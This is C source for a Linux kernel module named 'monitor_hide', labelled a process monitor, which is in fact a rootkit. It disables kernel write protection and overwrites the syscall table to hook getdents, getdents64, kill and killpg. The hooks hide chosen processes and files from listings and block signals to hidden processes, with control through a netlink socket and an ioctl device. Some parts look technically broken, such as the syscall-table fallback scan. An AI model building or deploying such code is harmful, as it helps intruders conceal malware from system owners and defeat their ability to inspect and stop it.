// SPDX-License-Identifier: GPL-2.0
/*
 * Process Monitor Kernel Module
 * Provides kernel-level process and file hiding capabilities
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/socket.h>
#include <linux/netlink.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/rwsem.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/dcache.h>
#include <linux/version.h>
#include <asm/unistd.h>
#include <net/sock.h>

#define MODULE_NAME "monitor_hide"
#define NL_PROTO 31
#define MAX_HIDDEN_PIDS 256
#define MAX_HIDDEN_FILES 128

/* Command definitions */
#define CMD_HIDE_PID    1
#define CMD_UNHIDE_PID  2
#define CMD_HIDE_FILE   3
#define CMD_UNHIDE_FILE 4
#define CMD_LIST_HIDDEN 5

/* Hidden process tracking */
struct hidden_pid {
    pid_t pid;
    char comm[TASK_COMM_LEN];
    struct list_head list;
};

/* Hidden file tracking */
struct hidden_file {
    char path[PATH_MAX];
    struct list_head list;
};

/* Device private data */
struct monitor_device {
    struct cdev cdev;
    struct device *dev;
    struct mutex lock;
};

/* Global variables */
static struct list_head hidden_pids_list;
static struct list_head hidden_files_list;
static DEFINE_RWLOCK(pids_lock);
static DEFINE_RWLOCK(files_lock);
static struct sock *nl_sock = NULL;
static int hidden_pid_count = 0;
static int hidden_file_count = 0;

/* Character device */
static dev_t dev_num;
static struct class *monitor_class = NULL;
static struct monitor_device monitor_dev;
static struct mutex device_mutex;

/* Original syscalls */
static asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
static asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
static asmlinkage long (*original_kill)(pid_t pid, int sig);
static asmlinkage long (*original_killpg)(pid_t pgrp, int sig);

/* Syscall table */
#if defined(__x86_64__)
static unsigned long **syscall_table = NULL;
#elif defined(__aarch64__)
static void **syscall_table = NULL;
#endif

/* CR0 register for write protection */
static unsigned long original_cr0;

/* Enable/disable writing to read-only memory */
static inline void disable_write_protection(void)
{
    preempt_disable();
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x10000);
}

static inline void enable_write_protection(void)
{
    write_cr0(original_cr0);
    preempt_enable();
}

/* Find syscall table */
static unsigned long **find_syscall_table(void)
{
    unsigned long **entry = NULL;
    unsigned long ptr = kallsyms_lookup_name("sys_call_table");

    if (ptr)
        return (unsigned long **)ptr;

    /* Fallback: scan for syscall table */
    for (ptr = (unsigned long)__builtin_return_address(0);
         ptr < ULONG_MAX;
         ptr += sizeof(void *)) {
        if (ptr == (unsigned long)&sys_close)
            return (unsigned long **)ptr;
    }

    return NULL;
}

/* Check if PID is hidden */
static bool is_pid_hidden(pid_t pid)
{
    struct hidden_pid *entry;
    bool found = false;

    read_lock(&pids_lock);
    list_for_each_entry(entry, &hidden_pids_list, list) {
        if (entry->pid == pid) {
            found = true;
            break;
        }
    }
    read_unlock(&pids_lock);

    return found;
}

/* Check if file path should be hidden */
static bool is_file_hidden(const char *path)
{
    struct hidden_file *entry;
    bool found = false;

    read_lock(&files_lock);
    list_for_each_entry(entry, &hidden_files_list, list) {
        if (strstr(path, entry->path) != NULL) {
            found = true;
            break;
        }
    }
    read_unlock(&files_lock);

    return found;
}

/* Hide a PID */
static int hide_pid(pid_t pid, const char *comm)
{
    struct hidden_pid *new_pid;
    struct hidden_pid *entry;

    /* Check if already hidden */
    if (is_pid_hidden(pid))
        return -EEXIST;

    new_pid = kmalloc(sizeof(struct hidden_pid), GFP_KERNEL);
    if (!new_pid)
        return -ENOMEM;

    new_pid->pid = pid;
    if (comm)
        strncpy(new_pid->comm, comm, TASK_COMM_LEN - 1);
    else
        new_pid->comm[0] = '\0';

    write_lock(&pids_lock);
    list_add_tail(&new_pid->list, &hidden_pids_list);
    hidden_pid_count++;
    write_unlock(&pids_lock);

    printk(KERN_INFO "monitor_hide: Hidden PID %d (%s)\n", pid, new_pid->comm);
    return 0;
}

/* Unhide a PID */
static int unhide_pid(pid_t pid)
{
    struct hidden_pid *entry, *tmp;
    bool found = false;

    write_lock(&pids_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            hidden_pid_count--;
            found = true;
            break;
        }
    }
    write_unlock(&pids_lock);

    if (found) {
        printk(KERN_INFO "monitor_hide: Unhidden PID %d\n", pid);
        return 0;
    }
    return -ENOENT;
}

/* Hide a file */
static int hide_file(const char *path)
{
    struct hidden_file *new_file;

    /* Check if already hidden */
    if (is_file_hidden(path))
        return -EEXIST;

    new_file = kmalloc(sizeof(struct hidden_file), GFP_KERNEL);
    if (!new_file)
        return -ENOMEM;

    strncpy(new_file->path, path, PATH_MAX - 1);
    new_file->path[PATH_MAX - 1] = '\0';

    write_lock(&files_lock);
    list_add_tail(&new_file->list, &hidden_files_list);
    hidden_file_count++;
    write_unlock(&files_lock);

    printk(KERN_INFO "monitor_hide: Hidden file %s\n", path);
    return 0;
}

/* Unhide a file */
static int unhide_file(const char *path)
{
    struct hidden_file *entry, *tmp;
    bool found = false;

    write_lock(&files_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_files_list, list) {
        if (strcmp(entry->path, path) == 0) {
            list_del(&entry->list);
            kfree(entry);
            hidden_file_count--;
            found = true;
            break;
        }
    }
    write_unlock(&files_lock);

    if (found) {
        printk(KERN_INFO "monitor_hide: Unhidden file %s\n", path);
        return 0;
    }
    return -ENOENT;
}

/* Hooked getdents64 syscall */
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
    long ret;
    struct linux_dirent64 *kdirent, *curr, *prev;
    unsigned long offset = 0;
    int reverted = 0;

    ret = original_getdents64(fd, dirent, count);
    if (ret <= 0)
        return ret;

    /* Copy to kernel space */
    kdirent = kmalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    curr = kdirent;
    prev = NULL;

    while (offset < ret) {
        /* Check if this entry should be hidden */
        bool should_hide = false;
        pid_t pid;
        char *endptr;
        struct path path;
        struct dentry *dentry;

        /* Check for PID in /proc */
        pid = simple_strtol(curr->d_name, &endptr, 10);
        if (*endptr == '\0' && pid > 0) {
            /* It's a numeric directory in /proc - likely a PID */
            if (is_pid_hidden(pid)) {
                should_hide = true;
            }
        }

        /* Check for hidden files */
        if (!should_hide) {
            if (is_file_hidden(curr->d_name)) {
                should_hide = true;
            }
        }

        if (should_hide) {
            /* Remove this entry */
            if (prev) {
                prev->d_reclen += curr->d_reclen;
            } else {
                /* First entry - shift everything */
                reverted = 1;
            }
            if (prev) {
                offset += curr->d_reclen;
                curr = (struct linux_dirent64 *)((char *)curr + curr->d_reclen);
            } else {
                unsigned long reclen = curr->d_reclen;
                char *next = (char *)curr + reclen;
                memmove(curr, next, ret - offset - reclen);
                ret -= reclen;
            }
        } else {
            prev = curr;
            offset += curr->d_reclen;
            curr = (struct linux_dirent64 *)((char *)curr + curr->d_reclen);
        }
    }

    /* Copy back to user space */
    if (copy_to_user(dirent, kdirent, ret)) {
        kfree(kdirent);
        return -EFAULT;
    }

    kfree(kdirent);
    return ret;
}

/* Hooked getdents syscall */
asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)
{
    long ret;
    struct linux_dirent *kdirent, *curr, *prev;
    unsigned long offset = 0;

    ret = original_getdents(fd, dirent, count);
    if (ret <= 0)
        return ret;

    kdirent = kmalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    curr = kdirent;
    prev = NULL;

    while (offset < ret) {
        bool should_hide = false;
        pid_t pid;
        char *endptr;

        pid = simple_strtol(curr->d_name, &endptr, 10);
        if (*endptr == '\0' && pid > 0) {
            if (is_pid_hidden(pid)) {
                should_hide = true;
            }
        }

        if (!should_hide && is_file_hidden(curr->d_name)) {
            should_hide = true;
        }

        if (should_hide) {
            if (prev) {
                prev->d_reclen += curr->d_reclen;
            }
            if (prev) {
                offset += curr->d_reclen;
                curr = (struct linux_dirent *)((char *)curr + curr->d_reclen);
            } else {
                unsigned long reclen = curr->d_reclen;
                char *next = (char *)curr + reclen;
                memmove(curr, next, ret - offset - reclen);
                ret -= reclen;
            }
        } else {
            prev = curr;
            offset += curr->d_reclen;
            curr = (struct linux_dirent *)((char *)curr + curr->d_reclen);
        }
    }

    if (copy_to_user(dirent, kdirent, ret)) {
        kfree(kdirent);
        return -EFAULT;
    }

    kfree(kdirent);
    return ret;
}

/* Hooked kill syscall - prevent killing hidden processes */
asmlinkage long hooked_kill(pid_t pid, int sig)
{
    if (is_pid_hidden(pid)) {
        printk(KERN_WARNING "monitor_hide: Blocked kill signal %d to hidden PID %d\n", sig, pid);
        return -EPERM;
    }
    return original_kill(pid, sig);
}

/* Hooked killpg syscall */
asmlinkage long hooked_killpg(pid_t pgrp, int sig)
{
    struct task_struct *task;

    /* Check if any process in the group is hidden */
    rcu_read_lock();
    for_each_process(task) {
        if (task_pgrp(task) == pgrp && is_pid_hidden(task->pid)) {
            rcu_read_unlock();
            printk(KERN_WARNING "monitor_hide: Blocked killpg signal to hidden process group %d\n", pgrp);
            return -EPERM;
        }
    }
    rcu_read_unlock();

    return original_killpg(pgrp, sig);
}

/* Netlink message handler */
static void nl_recv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlh;
    u32 *cmd;
    pid_t pid;
    char *data;
    int ret;

    nlh = nlmsg_hdr(skb);
    cmd = (u32 *)nlmsg_data(nlh);

    switch (*cmd) {
        case CMD_HIDE_PID:
            pid = *(pid_t *)(cmd + 1);
            data = (char *)(cmd + 2);
            ret = hide_pid(pid, data);
            break;

        case CMD_UNHIDE_PID:
            pid = *(pid_t *)(cmd + 1);
            ret = unhide_pid(pid);
            break;

        case CMD_HIDE_FILE:
            data = (char *)(cmd + 1);
            ret = hide_file(data);
            break;

        case CMD_UNHIDE_FILE:
            data = (char *)(cmd + 1);
            ret = unhide_file(data);
            break;

        default:
            ret = -EINVAL;
            break;
    }
}

/* Character device operations */
static int device_open(struct inode *inode, struct file *file)
{
    struct monitor_device *dev = container_of(inode->i_cdev, struct monitor_device, cdev);
    file->private_data = dev;
    return 0;
}

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    void __user *argp = (void __user *)arg;
    int ret = 0;
    pid_t pid;
    char path[PATH_MAX];

    switch (cmd) {
        case CMD_HIDE_PID:
            if (copy_from_user(&pid, argp, sizeof(pid_t)))
                return -EFAULT;
            ret = hide_pid(pid, NULL);
            break;

        case CMD_UNHIDE_PID:
            if (copy_from_user(&pid, argp, sizeof(pid_t)))
                return -EFAULT;
            ret = unhide_pid(pid);
            break;

        case CMD_HIDE_FILE:
            if (copy_from_user(path, argp, PATH_MAX))
                return -EFAULT;
            ret = hide_file(path);
            break;

        case CMD_UNHIDE_FILE:
            if (copy_from_user(path, argp, PATH_MAX))
                return -EFAULT;
            ret = unhide_file(path);
            break;

        default:
            ret = -ENOTTY;
            break;
    }

    return ret;
}

static const struct file_operations device_fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .unlocked_ioctl = device_ioctl,
    .compat_ioctl = device_ioctl,
};

/* Initialize character device */
static int __init chardev_init(void)
{
    int ret;

    ret = alloc_chrdev_region(&dev_num, 0, 1, MODULE_NAME);
    if (ret < 0) {
        printk(KERN_ERR "monitor_hide: Failed to allocate chrdev region\n");
        return ret;
    }

    cdev_init(&monitor_dev.cdev, &device_fops);
    monitor_dev.cdev.owner = THIS_MODULE;

    ret = cdev_add(&monitor_dev.cdev, dev_num, 1);
    if (ret < 0) {
        unregister_chrdev_region(dev_num, 1);
        return ret;
    }

    monitor_class = class_create(THIS_MODULE, MODULE_NAME);
    if (IS_ERR(monitor_class)) {
        cdev_del(&monitor_dev.cdev);
        unregister_chrdev_region(dev_num, 1);
        return PTR_ERR(monitor_class);
    }

    monitor_dev.dev = device_create(monitor_class, NULL, dev_num, NULL, "monitor");
    if (IS_ERR(monitor_dev.dev)) {
        class_destroy(monitor_class);
        cdev_del(&monitor_dev.cdev);
        unregister_chrdev_region(dev_num, 1);
        return PTR_ERR(monitor_dev.dev);
    }

    mutex_init(&monitor_dev.lock);

    printk(KERN_INFO "monitor_hide: Character device registered\n");
    return 0;
}

/* Netlink initialization */
static int __init netlink_init(void)
{
    struct netlink_kernel_cfg cfg = {
        .input = nl_recv_msg,
    };

    nl_sock = netlink_kernel_create(&init_net, NL_PROTO, &cfg);
    if (!nl_sock) {
        printk(KERN_ERR "monitor_hide: Failed to create netlink socket\n");
        return -ENOMEM;
    }

    printk(KERN_INFO "monitor_hide: Netlink socket created\n");
    return 0;
}

/* Module initialization */
static int __init monitor_hide_init(void)
{
    int ret;

    printk(KERN_INFO "monitor_hide: Module loading...\n");

    /* Initialize lists */
    INIT_LIST_HEAD(&hidden_pids_list);
    INIT_LIST_HEAD(&hidden_files_list);

    /* Find and hook syscalls */
    syscall_table = find_syscall_table();
    if (!syscall_table) {
        printk(KERN_ERR "monitor_hide: Could not find syscall table\n");
        return -ENOENT;
    }

    disable_write_protection();

    original_getdents64 = (void *)syscall_table[__NR_getdents64];
    original_getdents = (void *)syscall_table[__NR_getdents];
    original_kill = (void *)syscall_table[__NR_kill];
    original_killpg = (void *)syscall_table[__NR_killpg];

    syscall_table[__NR_getdents64] = (void *)hooked_getdents64;
    syscall_table[__NR_getdents] = (void *)hooked_getdents;
    syscall_table[__NR_kill] = (void *)hooked_kill;
    syscall_table[__NR_killpg] = (void *)hooked_killpg;

    enable_write_protection();

    /* Initialize character device */
    ret = chardev_init();
    if (ret < 0) {
        printk(KERN_ERR "monitor_hide: Character device init failed\n");
        goto err_chardev;
    }

    /* Initialize netlink */
    ret = netlink_init();
    if (ret < 0) {
        printk(KERN_ERR "monitor_hide: Netlink init failed\n");
        goto err_netlink;
    }

    printk(KERN_INFO "monitor_hide: Module loaded successfully\n");
    return 0;

err_netlink:
    device_destroy(monitor_class, dev_num);
    class_destroy(monitor_class);
    cdev_del(&monitor_dev.cdev);
    unregister_chrdev_region(dev_num, 1);

err_chardev:
    disable_write_protection();
    syscall_table[__NR_getdents64] = (void *)original_getdents64;
    syscall_table[__NR_getdents] = (void *)original_getdents;
    syscall_table[__NR_kill] = (void *)original_kill;
    syscall_table[__NR_killpg] = (void *)original_killpg;
    enable_write_protection();

    return ret;
}

/* Module cleanup */
static void __exit monitor_hide_exit(void)
{
    struct hidden_pid *pid_entry, *pid_tmp;
    struct hidden_file *file_entry, *file_tmp;

    printk(KERN_INFO "monitor_hide: Module unloading...\n");

    /* Cleanup netlink */
    if (nl_sock)
        netlink_kernel_release(nl_sock);

    /* Cleanup character device */
    device_destroy(monitor_class, dev_num);
    class_destroy(monitor_class);
    cdev_del(&monitor_dev.cdev);
    unregister_chrdev_region(dev_num, 1);

    /* Restore syscalls */
    if (syscall_table) {
        disable_write_protection();
        syscall_table[__NR_getdents64] = (void *)original_getdents64;
        syscall_table[__NR_getdents] = (void *)original_getdents;
        syscall_table[__NR_kill] = (void *)original_kill;
        syscall_table[__NR_killpg] = (void *)original_killpg;
        enable_write_protection();
    }

    /* Free hidden PIDs */
    list_for_each_entry_safe(pid_entry, pid_tmp, &hidden_pids_list, list) {
        list_del(&pid_entry->list);
        kfree(pid_entry);
    }

    /* Free hidden files */
    list_for_each_entry_safe(file_entry, file_tmp, &hidden_files_list, list) {
        list_del(&file_entry->list);
        kfree(file_entry);
    }

    printk(KERN_INFO "monitor_hide: Module unloaded\n");
}

module_init(monitor_hide_init);
module_exit(monitor_hide_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Process Monitor Development Team");
MODULE_DESCRIPTION("Kernel module for process and file hiding");
MODULE_VERSION("1.0");
